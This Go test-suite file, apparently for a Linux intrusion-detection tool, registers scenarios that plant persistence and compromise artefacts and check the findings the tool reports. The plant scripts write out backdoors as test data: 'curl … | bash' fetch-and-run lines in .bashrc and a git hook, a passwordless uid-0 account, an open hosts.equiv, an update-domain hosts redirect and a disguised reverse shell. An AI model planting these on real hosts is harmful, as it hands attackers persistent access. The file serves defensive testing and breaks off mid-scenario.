	// cenário em modo IMAGEM: é a resposta para "o host mente" — leia o disco
	// de fora, onde o kernel é o do analista (runbook §35.6).

	Register(Scenario{
		ID:     "60-persistencia-ao-vivo",
		Desc:   "as seis formas da §7 plantadas: unit, drop-in, timer, preload, conf e environment",
		Images: matriz,
		Plant:  persistencia,
		Expect: []Expect{
			{ID: "persist.ld_preload_global", Sev: "CRITICAL"},
			{ID: "persist.env_preload", Sev: "CRITICAL"},
			{ID: "persist.ld_so_conf_odd", Sev: "WARN"},
			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "updater.service"},
			{ID: "persist.unit_dropin_exec", Sev: "WARN", Subject: "ssh.service"},
			{ID: "persist.timer_frequent", Sev: "WARN", Subject: "beacon.timer"},
		},
		// O ld.so.preload invalida o resto do relatório, e isso precisa SAIR
		// impresso: é a propriedade emergente de ter Origin no modelo.
		ExpectOutput: []string{"CONFIANÇA REBAIXADA"},
		Exit:         2,
	})

	Register(Scenario{
		ID:   "61-persistencia-em-imagem",
		Desc: "o mesmo plantio, varrido DE FORA: persistência não precisa de host vivo",
		// O que este cenário prova não é a detecção — o 60 já provou. É que a
		// análise SOBREVIVE ao host: com --root não há /proc, não há processo,
		// e mesmo assim a persistência aparece inteira. É o caminho da §35.6
		// para quando o userland do alvo não é confiável.
		Images: minimal,
		Mode:   Image,
		Plant:  persistencia,
		Expect: []Expect{
			{ID: "persist.ld_preload_global", Sev: "CRITICAL"},
			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "updater.service"},
			{ID: "persist.unit_dropin_exec", Sev: "WARN"},
		},
		// Os checks de processo NÃO podem inventar resultado numa imagem.
		Forbid: []string{
			"proc.memfd_exec", "proc.exe_deleted", "proc.kthread_disguise",
			"correlate.revshell", "net.pivot",
		},
		// E a cobertura precisa CAIR dizendo isso — imagem sem processo não é
		// host sem implante.
		MustBeIncomplete: true,
		Exit:             2,
	})

	Register(Scenario{
		ID:     "62-cron-e-chaves",
		Desc:   "as duas persistências mais comuns em invasão real: cron e authorized_keys",
		Images: matriz,
		Plant:  agendamentoEChaves,
		Expect: []Expect{
			{ID: "persist.cron_suspect", Sev: "CRITICAL", Evidence: "roda como: root"},
			{ID: "persist.cron_frequent", Sev: "WARN"},
			// o at dispara UMA vez no futuro, e carrega o ambiente de quem o criou
			{ID: "persist.at_job", Sev: "CRITICAL", Evidence: "203.0.113.9"},
			{ID: "persist.ssh_forced_command", Sev: "CRITICAL", Evidence: "kali@attacker"},
			{ID: "persist.sshd_key_source", Sev: "WARN", Subject: "AuthorizedKeysCommand"},
			// inventário é MANUAL: "esta chave é de alguém do time?" não é
			// decidível por máquina
			{ID: "persist.ssh_keys", Sev: "MANUAL", Subject: "root"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "63-cron-e-chaves-em-imagem",
		Desc: "o mesmo plantio varrido DE FORA: agendamento e chave saem do disco",
		// Nada aqui depende de /proc, de crontab -l ou de sshd -T. É o que
		// permite responder sobre um host cujo userland não é confiável.
		Images: minimal,
		Mode:   Image,
		Plant:  agendamentoEChaves,
		Expect: []Expect{
			{ID: "persist.cron_suspect", Sev: "CRITICAL"},
			{ID: "persist.ssh_forced_command", Sev: "CRITICAL"},
			{ID: "persist.at_job"},
		},
		MustBeIncomplete: true,
		Exit:             2,
	})

	Register(Scenario{
		ID:   "64-gatilhos-de-execucao",
		Desc: "shell startup, BASH_ENV, rc.local, PAM e udev: cada um com o SEU evento",
		// O que junta arquivos tão diferentes é a mesma pergunta — QUANDO isto
		// roda. O evento é o que decide qual deles o atacante escolhe, e é o
		// que o operador precisa para saber o que já rodou desde a invasão.
		Images: matriz,
		Plant: `mkdir -p /etc/profile.d /etc/pam.d /etc/udev/rules.d /root
			# .bashrc realista: a §7.6 fala do arquivo de distro com dezenas de
			# linhas, porque é o comprimento dele que faz ninguém rolar até o fim
			i=1; while [ $i -le 20 ]; do printf 'alias l%d="ls -l"\n' $i >> /root/.bashrc; i=$((i+1)); done
			printf '\n\n' >> /root/.bashrc
			printf 'curl -s http://198.51.100.7/a | bash\n' >> /root/.bashrc
			printf 'export BASH_ENV=/tmp/.x\n' >> /root/.profile
			# ENV ao lado do BASH_ENV, de propósito: as duas já foram tratadas
			# como a mesma variável, e o achado de ENV saía com o título e a
			# severidade de BASH_ENV. São eventos OPOSTOS — BASH_ENV roda em
			# shell NÃO interativo, ENV em shell POSIX INTERATIVO —, e este
			# cenário existe para elas não colapsarem de novo.
			printf 'export ENV=/dev/shm/.shrc\n' >> /root/.profile
			printf '#!/bin/sh\n/dev/shm/agent &\nexit 0\n' > /etc/rc.local
			chmod +x /etc/rc.local
			printf 'auth optional pam_exec.so /tmp/.notify\n' >> /etc/pam.d/sshd
			printf 'ACTION=="add", RUN+="/tmp/.udev"\n' > /etc/udev/rules.d/99-x.rules
			sleep 0.2`,
		Expect: []Expect{
			{ID: "persist.shell_startup", Sev: "CRITICAL", Evidence: "FIM do arquivo"},
			// o caminho que quase ninguém confere: roda em script, cron e scp
			{ID: "persist.bash_env", Sev: "CRITICAL", Evidence: "NÃO interativo"},
			// ENV é o outro evento, e sai como achado PRÓPRIO. Crítico aqui
			// porque o ALVO está em tmpfs — para um caminho comum ele é aviso,
			// já que `ENV=$HOME/.shrc` é configuração de fábrica em vários
			// sistemas. É o alvo que decide, não a variável.
			{ID: "persist.shell_env", Sev: "CRITICAL", Evidence: "/dev/shm/.shrc"},
			{ID: "persist.trigger_exec", Sev: "CRITICAL", Subject: "/etc/rc.local"},
			{ID: "persist.pam_exec", Evidence: "a CADA autenticação"},
			{ID: "persist.udev_run", Evidence: "evento de dispositivo"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "65-confianca-e-deploy",
		Desc: "CA plantada, /etc/hosts, hook de git e auto_prepend: persistência fora de /etc/systemd",
		// A CA e o /etc/hosts juntos são um MITM completo e SILENCIOSO: o nome
		// resolve para o atacante e o certificado dele é aceito. Nenhuma
		// ferramenta reclama — não há erro de TLS, processo estranho nem porta
		// aberta.
		Images: matriz,
		Plant: `mkdir -p /usr/local/share/ca-certificates /srv/app/.git/hooks /etc/php/8.2/fpm /etc/aliases.d
			printf '192.0.2.9 deb.debian.org security.debian.org\n' >> /etc/hosts
			printf -- '-----BEGIN CERTIFICATE-----\nnaoehumcertificadovalido\n-----END CERTIFICATE-----\n' > /usr/local/share/ca-certificates/corp.crt
			printf '#!/bin/sh\ncurl -s http://198.51.100.7/a | bash\n' > /srv/app/.git/hooks/post-merge
			chmod +x /srv/app/.git/hooks/post-merge
			printf 'auto_prepend_file = /var/www/.init.php\n' > /etc/php/8.2/fpm/php.ini
			# host-based trust: o backdoor de acesso mais antigo do Unix. O ` + `
			# no hosts.equiv confia em QUALQUER host e QUALQUER usuário — login
			# sem senha de qualquer lugar. O .rhosts de root nomeia um host: raro
			# em sistema moderno, mas não é irrestrito, então sai como aviso.
			printf '+\n' > /etc/hosts.equiv
			printf 'buildserver.interno\n' > /root/.rhosts
			sleep 0.2`,
		Expect: []Expect{
			// domínio de ATUALIZAÇÃO: quem controla para onde ele aponta
			// controla o que o host instala
			{ID: "persist.hosts_override", Sev: "CRITICAL", Subject: "deb.debian.org"},
			// o `+` do hosts.equiv é login sem senha de QUALQUER lugar: CRÍTICO
			{ID: "persist.host_trust", Sev: "CRITICAL", Subject: "/etc/hosts.equiv"},
			// certificado ilegível continua sendo achado: a presença é o fato
			{ID: "persist.ca_planted", Evidence: "PRESENÇA"},
			// hook de git sobrevive ao redeploy e não mora em /etc
			{ID: "persist.trigger_exec", Sev: "CRITICAL", Evidence: "sobrevive ao redeploy"},
			// A SUBSTÂNCIA, não o número da seção. O "§16" que estava aqui era um
			// ponteiro de runbook embutido na prosa da evidência, e a
			// reformulação do relatório o tirou de todos os checks — a referência
			// virou campo estruturado (`ref`), que é onde ela pertence. Cobrar o
			// ponteiro era amarrar o contrato à formatação; o que o cenário quer
			// provar é que o achado explica POR QUE um webshell sem arquivo no
			// docroot é pior de achar.
			{ID: "persist.web_prepend", Evidence: "o docroot fica limpo"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "66-cadeia-completa",
		Desc: "invasão inteira com peças que parecem legítimas: nome de sistema, caminho de sistema, comando limpo",
		// Cada peça isolada passa: /usr/local/sbin é caminho de sistema, o nome
		// imita um serviço do systemd, o comando não baixa nada, a chave SSH
		// não tem command=. Nenhum check de CAMINHO ou de CONTEÚDO dispara.
		//
		// O que denuncia são duas perguntas ESTRUTURAIS, e nenhuma delas olha
		// nome, caminho ou conteúdo:
		//
		//   nenhum pacote reivindica este binário          §24
		//   três mecanismos diferentes apontam para ele    §7
		//
		// Renomear, mover para outro diretório de sistema ou trocar o payload
		// não muda nenhuma das duas.
		Images: matriz,
		Plant:  cadeiaCompleta,
		Expect: []Expect{
			{ID: "correlate.persistence_redundant", Sev: "CRITICAL",
				Subject: "/usr/local/sbin/systemd-oomd-helper", Evidence: "3 mecanismos"},
			{ID: "integrity.no_package_owner", Subject: "/usr/local/sbin/systemd-oomd-helper"},
			{ID: "persist.ssh_keys", Sev: "MANUAL"},
		},
		// E o roteiro de limpeza precisa sair: sobrando um mecanismo, ele volta.
		ExpectOutput: []string{"persistence_redundant + no_package_owner"},
		Exit:         2,
	})

	Register(Scenario{
		ID:   "67-privilegio",
		Desc: "uid 0 disfarçado, senha vazia, conta de serviço com shell e grupo que é root",
		// É o UID que define o poder, não o nome: `systemd-net` com uid 0 É
		// root, e auditoria por nome de usuário não veria isso.
		Images: matriz,
		Plant: `printf 'systemd-net:x:0:0::/root:/bin/sh\n' >> /etc/passwd
			printf 'systemd-net::19000:0:99999:7:::\n' >> /etc/shadow
			printf 'backupd:x:117:117::/var/backups:/bin/bash\n' >> /etc/passwd
			printf 'docker:x:998:app\n' >> /etc/group
			sleep 0.2`,
		Expect: []Expect{
			{ID: "priv.uid_zero", Sev: "CRITICAL", Subject: "systemd-net",
				Evidence: "auditoria por NOME"},
			{ID: "priv.no_password", Sev: "CRITICAL", Subject: "systemd-net"},
			{ID: "priv.service_account_shell", Sev: "WARN", Subject: "backupd"},
			{ID: "priv.root_equivalent_group", Sev: "WARN", Subject: "docker",
				Evidence: "monta o filesystem"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "68-linhagem",
		Desc: "daemon de rede gerando shell: a cadeia clássica de pós-exploração web",
		// Nenhum dos três processos é suspeito sozinho — `sh` e `sleep` são
		// rotina. A LINHAGEM é o sinal, e ela só existe com pai e filho de
		// verdade.
		Images: matriz,
		Plant: `mkdir -p /usr/local/bin
			cp /helper /usr/local/bin/nginx
			/usr/local/bin/nginx spawn /bin/sh -c "sleep 300" &
			sleep 0.5`,
		Expect: []Expect{
			{ID: "proc.shell_from_service", Sev: "CRITICAL",
				Evidence: "não abre shell no curso normal"},
			// e o binário falso em /usr/local/bin não tem dono de pacote
			{ID: "integrity.no_package_owner"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "69-pty-de-conta-de-servico",
		Desc: "conta de serviço com terminal: alguém entrou com a identidade dela",
		// Um PTY não é malicioso — é o normal de toda sessão SSH. O sinal é
		// QUEM o tem: conta de serviço roda daemon, não faz login.
		//
		// SYS_PTRACE não é conveniência: ler /proc/<pid>/fd de processo com
		// credencial diferente exige essa capability, e sem ela a ferramenta
		// declara a lacuna em vez de dizer que não há PTY. É o comportamento
		// certo, e o cenário precisa da capability para exercitar o achado.
		Images: matriz,
		Caps:   []string{"SYS_PTRACE"},
		Plant: `useradd -u 500 -M -s /bin/sh svcapp 2>/dev/null || adduser -D -u 500 -s /bin/sh svcapp 2>/dev/null
			/helper pty 500 /bin/sh -c "sleep 300" &
			sleep 0.6`,
		Expect: []Expect{
			{ID: "proc.service_account_pty", Sev: "WARN",
				Evidence: "não faz login interativo"},
		},
		Exit: -1, // o /helper do rig não tem dono de pacote
	})

	// ------------------------------------------------- adversário, não mecanismo
	//
	// Os cenários acima testam UMA forma cada: plantam um mecanismo, afirmam um
	// check. Isso é a base, e não é a mesma coisa que um incidente — um
	// comprometimento real deixa cinco a dez artefatos ao mesmo tempo, no mesmo
	// processo, com relação causal entre eles.
	//
	// Os dois abaixo têm eixo de SOFISTICAÇÃO: o mesmo objetivo do atacante,
	// executado de forma barulhenta e de forma cuidadosa. É o par que mede o
	// que a ferramenta enxerga de verdade.

	Register(Scenario{
		ID:   "70-composto-gsocket",
		Desc: "a forma que o runbook §5.10 descreve, inteira: caminho, disfarce, canal e marcador",
		// Montado a partir do que a §5.10 e a §17 documentam sobre a família:
		// binário em ~/.config com nome plausível, processo renomeado para
		// parecer thread de kernel, saída para relay em 443 (sem listener) e
		// prefixo de variável que entrega o nome.
		//
		// O valor não é cada check isolado — é que QUATRO disparam no mesmo
		// processo e o operador recebe uma história, não quatro fatos soltos.
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			adduser -D -u 1000 node 2>/dev/null
			mkdir -p /home/node/.config/htop
			cp /helper /home/node/.config/htop/defunct
			/helper listen 198.51.100.241:443 &
			sleep 0.4
			export GSOCKET_ARGS="-s segredo" GS_ARGS="-liD"
			/home/node/.config/htop/defunct argv0 "[kworker/1:2]" /home/node/.config/htop/defunct revshell 198.51.100.241:443 &
			sleep 0.6`,
		Expect: []Expect{
			{ID: "correlate.revshell", Sev: "CRITICAL"},
			{ID: "proc.kthread_disguise", Sev: "CRITICAL"},
			{ID: "proc.suspicious_path", Sev: "WARN"},
			// O mais barato e o de maior alavanca: o NOME da ferramenta muda a
			// prioridade do resto da resposta antes de qualquer engenharia
			// reversa (runbook §5.10).
			{ID: "proc.env_tool_marker", Sev: "CRITICAL", Evidence: "GSocket"},
		},
		// O valor do composto não é cada check: é a ferramenta contar UMA
		// história em vez de quatro fatos soltos.
		ExpectOutput:   []string{"revshell + egress_unowned"},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "71-adversario-competente",
		Desc: "o MESMO objetivo, evitando cada regra: mede o que hoje passa batido",
		// ESTE CENÁRIO DOCUMENTA UM LIMITE, NÃO UM REQUISITO.
		//
		// O atacante aqui leu as mesmas seções que eu: binário em /usr/local/sbin
		// com nome plausível, sem exec -a, saída para 443 sem dup2 sobre 0/1/2,
		// beacon de hora em hora em vez de 45s, persistência por drop-in com
		// comando de aparência inocente.
		//
		// A PREVISÃO SE CUMPRIU, e é por isso que este comentário mudou.
		//
		// A versão original media UM aviso, e dizia: "quando saída para IP
		// público (3.2) e integridade de pacote (fase 7) chegarem, este cenário
		// QUEBRA — de propósito". Os dois chegaram, e ele quebrou.
		//
		// São TRÊS ângulos independentes agora, e nenhum olha o conteúdo do
		// comando nem o nome do binário:
		//
		//	§7.2   alguém acrescentou execução a uma unit alheia
		//	§24    nenhum pacote reivindica este binário
		//	§4.3   e ele fala com um endereço público
		//
		// O adversário derrota qualquer um dos três isoladamente — empacotar o
		// implante mata o §24, persistir por outro caminho mata o §7.2, esperar
		// para conectar mata o §4.3. Derrotar os três ao mesmo tempo é outro
		// nível de esforço, e é esse o ganho: não é uma regra melhor, são três
		// perguntas que não se contornam com a mesma jogada.
		//
		// O LIMITE QUE ESTE CENÁRIO REGISTRAVA FOI FECHADO, e é a segunda vez
		// que ele mede a própria previsão se cumprindo.
		//
		// O texto anterior dizia: "os três achados têm sujeitos diferentes — um
		// pid, um caminho e um nome de unit — e a correlação agrupa por
		// sujeito. Ver que são o MESMO ator ainda é trabalho humano." Era
		// verdade, e a saída era esta:
		//
		//	⚠ 2×            binário que nenhum pacote reivindica
		//	⚠ pid=17        conexão para endereço público
		//	⚠ sshd.service  drop-in acrescenta execução
		//
		// Três avisos, três sujeitos, UM binário. A resolução de ator
		// (check/ator.go) passou a traduzir pid e unit para o binário por trás
		// deles, e o mesmo host agora sai como uma história só — que é o que
		// esta ferramenta promete e o que uma lista de fatos não dá.
		//
		// O que continua fora do alcance é o adversário cujos sujeitos não
		// apontam para o mesmo lugar: implante empacotado, persistência por
		// caminho que não cita o binário, execução por interpretador. Ali não
		// há o que correlacionar, e a resposta é check novo — não correlação
		// melhor.
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		Plant: `ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			mkdir -p /usr/local/sbin /etc/systemd/system/sshd.service.d
			cp /helper /usr/local/sbin/systemd-netlinkd
			/helper listen 198.51.100.241:8443 &
			sleep 0.4
			/usr/local/sbin/systemd-netlinkd connect 198.51.100.241:8443 &
			printf '[Service]\nExecStartPre=/usr/local/sbin/systemd-netlinkd sleep 1\n' > /etc/systemd/system/sshd.service.d/10-hardening.conf
			printf '[Timer]\nOnUnitActiveSec=1h\n' > /etc/systemd/system/systemd-netlinkd.timer
			sleep 0.5`,
		Expect: []Expect{
			// O Subject aqui é o que o ExpectOutput cobrava com "(sshd.service)":
			// que o sujeito PRÓPRIO do achado sobreviva ao agrupamento por ator.
			// Ele sobrevive — o relatório detalhado só deixou de pôr parênteses
			// nele. A propriedade é do dado, e é aqui que ela para de depender
			// de como o texto decide se apresentar.
			{ID: "persist.unit_dropin_exec", Sev: "WARN", Subject: "sshd.service"},
			// Os dois que fecharam a lacuna prevista.
			{ID: "integrity.no_package_owner", Subject: "/usr/local/sbin/systemd-netlinkd"},
			{ID: "net.egress_unowned", Evidence: "nenhuma lista de reputação"},
		},
		Forbid: []string{
			"correlate.revshell", "proc.kthread_disguise", "proc.suspicious_path",
			"proc.memfd_exec", "persist.timer_frequent", "persist.unit_exec_suspect",
			// e o catálogo de famílias também não pega: renomear o binário o
			// derrota por completo. É o limite do atalho da §5.10, e é por isso
			// que ele não pode ser a detecção primária.
			"tool.binary", "tool.artifact",
		},
		// O QUE ESTE CENÁRIO MEDE AGORA, e o motivo de ele existir: não é cada
		// check, é os três chegarem ao operador como um alvo só. A linha de foco
		// funde os três no binário /usr/local/sbin/systemd-netlinkd, prova de que
		// a fusão foi por ATOR — o caminho não é sujeito de dois dos três achados.
		// O -v mostra o sujeito PRÓPRIO de cada achado sobrevivendo ao grupo.
		Args: []string{"-v"},
		ExpectOutput: []string{
			"/usr/local/sbin/systemd-netlinkd",
			"no_package_owner + egress_unowned + unit_dropin_exec",
			"(pid=",
		},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "72-ld-preload-por-processo",
		Desc: "LD_PRELOAD no ambiente de um processo vivo rebaixa a confiança da execução",
		// A versão discreta do /etc/ld.so.preload: injeta só em quem herdou a
		// variável e não deixa arquivo global. Como o global, ele muda o valor
		// de TODOS os outros achados — e é isso que o ExpectOutput trava.
		Images: matriz,
		Plant: `LD_PRELOAD=/dev/shm/x.so /helper sleep 300 &
			sleep 0.4`,
		Expect:       []Expect{{ID: "proc.ld_preload_env", Sev: "CRITICAL"}},
		ExpectOutput: []string{"CONFIANÇA REBAIXADA"},
		Exit:         2,
	})

	Register(Scenario{
		ID:   "73-ferramentas-conhecidas",
		Desc: "reconhece a família por config em disco e por nome de executável",
		// A rota da §5.10 que tem mais alcance que a de variável de ambiente: a
		// maioria dos implantes não usa env, usa arquivo de config. E ela
		// funciona em imagem montada.
		//
		// O frpc aqui NÃO está rodando — só referenciado num Exec= de unit. É o
		// caso que importa: a ferramenta que roda no próximo boot.
		Images: matriz,
		Plant: `mkdir -p /root/.config/rclone /etc/cloudflared /var/lib/tailscale /etc/xmrig /usr/local/bin /etc/systemd/system
			printf '[remoto]\ntype = s3\n' > /root/.config/rclone/rclone.conf
			printf 'tunnel: abc\n' > /etc/cloudflared/config.yml
			cp /helper /usr/local/bin/xmrig
			printf '[Service]\nExecStart=/usr/local/bin/frpc -c /etc/frp/frpc.ini\n' > /etc/systemd/system/frp.service
			/usr/local/bin/xmrig sleep 300 &
			sleep 0.4`,
		Expect: []Expect{
			{ID: "tool.artifact", Sev: "CRITICAL", Subject: "XMRig"},
			{ID: "tool.artifact", Sev: "WARN", Subject: "rclone"},
			{ID: "tool.artifact", Sev: "WARN", Subject: "Tailscale"},
			// nome de executável, no processo vivo E no Exec= de uma unit
			{ID: "tool.binary", Sev: "CRITICAL", Subject: "XMRig"},
			{ID: "tool.binary", Subject: "frp", Evidence: "frp.service"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "73b-scanner-de-rede-em-vm-invadida",
		Desc: "o Explorer do runZero rodando numa VM de aplicação: a capacidade não é acesso, é CONHECIMENTO da rede interna",
		// A pergunta que originou esta entrada: invasor entra numa VM e roda um
		// scanner de inventário para mapear a rede interna. Encontrá-lo muda a
		// pergunta de "o que foi feito nesta máquina" para "o que já foi
		// aprendido sobre TODAS as outras" — e o resultado do scan já saiu daqui.
		//
		// O nome de instalação carrega o UUID DA ORGANIZAÇÃO
		// (`runzero-agent-<uuid>`), e ele muda a cada instalação. Um catálogo
		// que só casa nome inteiro passava direto por isso em todo host real —
		// é o cenário que trava o casamento por PREFIXO.
		Images: matriz,
		Plant: `mkdir -p /opt/runzero/bin /etc/runzero
			cp /helper /opt/runzero/bin/runzero-agent-aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee
			printf 'token=abc\n' > /etc/runzero/config
			/opt/runzero/bin/runzero-agent-aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee sleep 300 &
			sleep 0.4`,
		Expect: []Expect{
			// config em disco — a rota que funciona em imagem montada
			{ID: "tool.artifact", Subject: "runZero Explorer"},
			// e o binário com o uuid no nome, que é o que o prefixo pega
			{ID: "tool.binary", Subject: "runZero Explorer"},
			{ID: "tool.binary", Evidence: "inventário"},
		},
		// -v porque a asserção é sobre a NOTA da família, e evidência só sai
		// no relatório detalhado. É ela que direciona: onde procurar o rastro
		// de uma varredura que quase não deixa conexão para trás.
		Args:         []string{"-v"},
		ExpectOutput: []string{"socket de pacote", "EXFILTRADO", "reconhecimento interno"},
		Exit:         2,
	})

	Register(Scenario{
		ID:   "74-vigia-de-arquivo-que-recria",
		Desc: "processo sem dono de pacote vigiando /etc/cron.d: é assim que o backdoor removido volta",
		// A frase que este check existe para explicar: "removi o backdoor e ele
		// voltou". Quem recria o arquivo apagado precisa SABER que ele sumiu, e
		// vigia o DIRETÓRIO — que é o que sobrevive ao `rm`.
		//
		// O vigia não abre porta, não tem cron e não tem unit: nenhum outro
		// check desta ferramenta o alcança.
		Images: matriz,
		// Os dois diretórios são CRIADOS antes: um watch em caminho ausente
		// falha, e o helper morre em vez de fingir que vigiou — foi assim que
		// a primeira versão deste cenário passou por não ter vigia nenhum.
		Plant: `mkdir -p /usr/local/sbin /etc/cron.d /etc/ssh
			cp /helper /usr/local/sbin/.sync
			/usr/local/sbin/.sync vigia /etc/cron.d /etc/ssh &
			sleep 0.5`,
		Expect: []Expect{
			{ID: "persist.file_watch", Sev: "CRITICAL", Evidence: "/etc/cron.d"},
			{ID: "persist.file_watch", Evidence: "nenhum pacote reivindica"},
			// O MECANISMO do "removi e voltou", que é a frase que este check
			// existe para explicar. Estava sendo cobrado do relatório mesmo com
			// -v, e ali não aparecia: é a terceira linha de evidência, e o -v
			// corta em maxEvidencia. No JSONL está inteira.
			{ID: "persist.file_watch", Evidence: "recriá-lo antes de a próxima linha"},
		},
		// O passo que evita o "voltou" é NextStep, e NextStep só sai no
		// relatório detalhado — a asserção precisa do -v para alcançá-lo.
		Args:         []string{"-v"},
		ExpectOutput: []string{"ANTES de apagar"},
		Exit:         2,
	})

	Register(Scenario{
		ID:   "74b-vigia-fora-de-persistencia-nao-acusa",
		Desc: "o contrapeso: o MESMO binário sem dono, vigiando cache em vez de persistência, não pode virar achado",
		// Metade nenhuma basta sozinha, e este cenário trava a que dá para
		// construir num contêiner: sem alvo de PERSISTÊNCIA não há achado.
		//
		// Vigiar arquivo é comum — systemd, portais de desktop, indexadores e
		// agentes de configuração fazem isso o tempo todo. Um check que
		// acusasse o ESTADO encheria o relatório em todo host com interface
		// gráfica, e um check que fala sempre é um check que ninguém lê.
		Images: matriz,
		Plant: `mkdir -p /usr/local/sbin /var/cache/app
			cp /helper /usr/local/sbin/.sync
			/usr/local/sbin/.sync vigia /var/cache/app &
			sleep 0.5`,
		Forbid: []string{"persist.file_watch"},
		Exit:   -1,
		// Orçamento de ruído MEDIDO: o binário sem dono em /usr/local/sbin
		// continua sendo achado de propriedade (§24), e isso é correto — o que
		// este cenário afirma é o silêncio do §7.12.
		MaxWarn: 2,
	})

	// ---------------------------------------------------------------- modo image

	Register(Scenario{
		ID:   "20-image-symlink-absoluto",
		Desc: "imagem com symlink absoluto não pode ler o host do analista",
		// Symlink absoluto é NORMAL em rootfs real (/etc/os-release →
		// /usr/lib/os-release). Antes da correção, varrer uma imagem imprimia
		// o hostname e a distro do ANALISTA atribuídos a ela.
		Images: minimal,
		Mode:   Image,
		Plant: `ln -sf /etc/hostname /etc/hostname.link
			rm -f /etc/os-release && ln -s /nao/existe/os-release /etc/os-release`,
		Exit: -1,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	Register(Scenario{
		ID:     "21-image-sem-processo",
		Desc:   "imagem montada não tem processo: os checks de proc viram NÃO VERIFICADO",
		Images: minimal,
		Mode:   Image,
		// Zero processos numa imagem não é "host limpo" — é ausência de fonte,
		// e precisa aparecer como tal.
		Forbid:           []string{"proc.memfd_exec", "proc.exe_deleted", "proc.kthread_disguise"},
		MustBeIncomplete: true,
		Exit:             1,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	// ------------------------------------------------------- fora do contêiner

	Register(Scenario{
		ID:   "90-kernel-2.6",
		Desc: "procfs de kernel 2.6.32 (RHEL 6): campos ausentes em /proc/<pid>/status",
		Untestable: "os cenários 50–52 cobrem 3.18 e 4.14, que é até onde o initramfs " +
			"de Alpine atual boota. Descer a 2.6.32 exigiria um rootfs de época " +
			"junto — e o próprio runtime do Go não sustenta mais esse kernel.",
	})

	// ----------------------------------------------------------------- VM
	//
	// Kernel próprio. É o que contêiner não alcança, porque compartilha o do
	// host: opção de mount de /proc, sysctl, módulo, cgroup, eBPF.

	Register(Scenario{
		ID:   "30-hidepid-root",
		Desc: "com root, hidepid=2 não esconde nada: o implante é visto",
		Mode: VM,
		Setup: `adduser -D -u 1000 app
			/helper argv0 "[kworker/0:9]" /helper sleep 300 &
			sleep 0.4
			mount -o remount,hidepid=2 /proc`,
		Expect:         []Expect{{ID: "proc.kthread_disguise", Sev: "CRITICAL"}},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "31-hidepid-sem-root",
		Desc: "sem root sob hidepid=2 o implante é INVISÍVEL — e a ferramenta precisa DIZER isso",
		// É o defeito que a revisão de código encontrou, no ambiente exato em
		// que ele se manifestava: a ferramenta via 4 de 310 processos e
		// imprimia "RESULT: OK, exit 0" com um implante CRITICAL bem ali.
		// A asserção é dupla e é o coração da suíte: o achado NÃO aparece
		// (nada a fazer, ele é mesmo invisível) E o veredito NÃO pode ser OK.
		Mode: VM,
		User: "app",
		Setup: `adduser -D -u 1000 app
			/helper argv0 "[kworker/0:9]" /helper sleep 300 &
			sleep 0.4
			mount -o remount,hidepid=2 /proc`,
		Forbid:           []string{"proc.kthread_disguise"},
		MustBeIncomplete: true,
		Exit:             1,
		// Orçamento de ruído MEDIDO: silêncio é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	// ------------------------------------------------------- kernel de época
	//
	// O único eixo que contêiner nenhum alcança. Exige `make vm-kernels`, que
	// baixa os dois kernels; sem ele estes cenários são PULADOS com o motivo
	// dito em voz alta.
	//
	// 3.18 é o mais antigo que ainda boota com este initramfs (2014). 4.14 é o
	// LTS do Amazon Linux 2 e da era do Ubuntu 18.04 — o "legado" que mais se
	// encontra em produção de verdade.

	Register(Scenario{
		ID:     "50-kernel-3.18-limpo",
		Desc:   "kernel de 2014, guest limpo: cobertura completa e nenhum achado",
		Mode:   VM,
		Kernel: "3.18",
		// E é aqui que a regra "sem MECANISMO não é lacuna" fica provada contra
		// um kernel de verdade. Este guest não tem `bpf(2)` — a distribuição o
		// compilou sem CONFIG_BPF_SYSCALL —, então não existe programa eBPF
		// para enumerar e a cobertura continua completa. A ferramenta DIZ isso
		// em vez de calar, e diz sem afirmar versão: a primeira versão da frase
		// dizia "anterior ao 3.18" e saiu num guest 3.18 e num 4.14.
		Expect: []Expect{
			{ID: "kernel.bpf_inventory", Sev: "INFO", Evidence: "não tem a syscall bpf(2)"},
		},
		Exit:           0,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:     "51-kernel-3.18-implante",
		Desc:   "kernel de 2014 enxerga os mesmos implantes que o kernel atual",
		Mode:   VM,
		Kernel: "3.18",
		Setup:  implantes,
		Expect: []Expect{
			{ID: "proc.kthread_disguise", Sev: "CRITICAL"},
			{ID: "proc.memfd_exec", Sev: "CRITICAL"},
			{ID: "proc.maps_rwx_anon", Sev: "WARN"},
			{ID: "proc.tracer", Sev: "WARN"},
			{ID: "proc.caps_unexpected", Sev: "WARN"},
			{ID: "proc.suspicious_path", Sev: "WARN"},
		},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:     "52-kernel-4.14-implante",
		Desc:   "kernel do Amazon Linux 2 enxerga os mesmos implantes",
		Mode:   VM,
		Kernel: "4.14",
		Setup:  implantes,
		Expect: []Expect{
			{ID: "proc.kthread_disguise", Sev: "CRITICAL"},
			{ID: "proc.memfd_exec", Sev: "CRITICAL"},
			{ID: "proc.tracer", Sev: "WARN"},
		},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "53-cgroup-v1-puro",
